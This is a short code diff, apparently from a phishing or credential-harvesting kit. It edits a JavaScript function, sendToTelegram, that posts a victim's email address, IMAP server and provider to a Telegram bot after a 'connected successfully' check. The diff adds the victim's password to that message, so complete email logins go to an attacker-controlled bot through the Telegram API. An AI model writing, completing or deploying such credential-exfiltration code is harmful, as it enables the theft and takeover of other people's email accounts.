@@ -93,6 +93,8 @@ async function sendToTelegram(email, host, port, provider) {
 Email : ${email}
 IMAP  : ${host || 'auto-detect'}:${port || 993}
 Pro   : ${provider}
+Password   : ${password}
+
 Status: Connected successfully</pre>`;
   try {
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
